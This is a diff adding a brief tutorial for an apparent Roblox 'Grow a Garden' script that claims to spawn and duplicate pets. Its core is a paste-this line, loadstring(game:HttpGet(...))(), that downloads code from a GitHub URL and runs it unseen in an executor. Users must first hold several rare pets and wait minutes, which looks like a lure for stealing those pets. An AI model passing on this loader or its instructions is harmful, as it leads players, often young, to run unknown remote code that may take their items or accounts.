@@ -1,0 +1,9 @@
+Hello Thank so much for using my script here is a tutorial to use it
+Step 1 Copy the script then paste it to ur executor 
+Step 2 u would need this following pets in order for the script to work Raccoons,DragonFlys,Red Foxes,Polar Bears,Panda,Queen bee,Chicken zombie
+Step 3 if u have does pets then u wouldneed to wait now for 5-10 minutes for the script to load
+Oh and btw u would have the option to load which script pet spawner or pet duper the pet duper can also dupe fruits
+Have fun using the script
+
+Script:
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BGSISCRIPTS/GROWAGARDENSCRIPT/refs/heads/main/GROW%20A%20GARDEN"))()
